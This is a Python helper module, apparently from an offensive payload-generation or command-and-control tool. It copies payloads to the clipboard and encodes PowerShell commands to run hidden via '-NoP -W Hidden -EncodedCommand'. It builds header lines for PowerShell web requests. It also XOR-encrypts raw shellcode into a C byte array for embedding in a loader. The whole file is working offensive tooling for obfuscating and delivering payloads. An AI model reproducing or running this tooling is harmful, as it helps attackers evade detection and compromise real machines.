import os
import sys
import subprocess
import base64
import random
from textwrap import wrap
import pyperclip
from core import print_override
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


def copy_and_print(payload):
	if payload:
		final_cmd = payload
		pyperclip.copy(final_cmd)
		print(brightyellow + final_cmd)
		print(brightgreen + "[+] Payload copied to clipboard")
		return final_cmd

	else:
		print(brightred + f"[!] You must provide a payload!")


def encode_win_payload(payload, no_child):
	#payload = ";".join(payload)
	encoded = base64.b64encode(payload.encode('utf-16le')).decode()

	if not no_child or no_child is None or no_child == "" or no_child is not True:
		final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

	else:
		final_cmd = encoded

	return final_cmd


def build_powershell_headers(headers, nostart=False, first=False):
	ps_hdr_lines = []
	for name, val in headers.items():
		if nostart == False and first is True:
			ps_hdr_lines.append(f"$req.Headers.Add('{name}','{val}');")

		elif nostart == False and first is False:
			ps_hdr_lines.append(f"$req2.Headers.Add('{name}','{val}');")

		elif nostart == True and first is False:
			ps_hdr_lines.append(f"$req2.Headers.Add('{name}', '{val}');")

		elif nostart == True and first is True:
			ps_hdr_lines.append(f"$req.Headers.Add('{name}', '{val}');")

		else:
			print(brightred + f"[!] Unable to build headers dynamically!")
			return None

	# join into one block
	hdr_block = "".join(ps_hdr_lines)

	return hdr_block

class XorEncode:
	def __init__(self):
		self.development = True

	def parse_quoted_hex_literal(self, path: str) -> bytes:
		with open(path, 'r', encoding='utf-8') as f:
			lines = f.readlines()

		# strip quotes and whitespace, join into one long string:
		joined = ''.join(line.strip().strip('"') for line in lines)
		# now joined == r'\xe8\x7a\xdb\x01\x00…'

		# decode Python-style escapes (\xNN → raw byte), then to bytes
		decoded_str = joined.encode('utf-8').decode('unicode_escape')
		return decoded_str.encode('latin-1')


	def xor_data(self, data: bytes, key: bytes) -> bytes:
		return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


	def main(self, shellcode_file, output_file, xor_key, c_outputer):
		if not os.path.isfile(shellcode_file):
			print("Input literal file not found.")
			sys.exit(2)

		try:
			key = bytes.fromhex(xor_key)
		except ValueError:
			print("Invalid key hex string.")
			sys.exit(3)

		# 1) parse raw shellcode bytes from your quoted-literal format
		raw_shell = self.parse_quoted_hex_literal(shellcode_file)

		# 2) XOR‑encrypt it
		encrypted = self.xor_data(raw_shell, key)

		# 3) write the encrypted blob
		with open(output_file, 'wb') as f:
			f.write(encrypted)
		#print(f"Wrote {len(encrypted)} bytes of encrypted shellcode to {output_file}")

		# 4) emit a C array to a .c file
		with open(c_outputer, 'w', encoding='utf-8') as f:
			#f.write("// Auto‑generated encrypted shellcode\n")
			#f.write(f"unsigned char enc_shellcode[] = {{\n    ")
			# split 16 bytes per line:
			for i, b in enumerate(encrypted):
				f.write(f"0x{b:02x}, ")
				#if (i + 1) % 16 == 0:
					#f.write("\n    ")
			#f.write("\n};\n")
			#f.write(f"unsigned int enc_shellcode_len = {len(encrypted)};\n")

		with open(c_outputer, "rb") as f:
			payload = f.read()

		#print(f"Wrote C initializer to {c_outputer}")
		return payload

